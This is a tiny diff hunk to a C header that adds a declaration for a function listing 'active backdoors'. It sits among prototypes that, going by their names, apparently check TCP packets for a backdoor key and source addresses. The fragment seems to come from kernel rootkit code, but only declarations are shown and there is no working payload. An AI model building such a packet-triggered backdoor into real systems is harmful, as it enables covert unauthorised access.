@@ -132,6 +132,7 @@ struct kv_crypto_st *kv_sock_get_mgc(void);
 #endif
 bool kv_bd_search_iph_source(__be32 saddr);
 bool kv_bd_search_iph_source_port(__be16 port);
+void kv_show_active_backdoors(void);
 bool kv_check_bdkey(struct tcphdr *, struct sk_buff *);
 void kv_bd_cleanup_item(__be32 *);
 
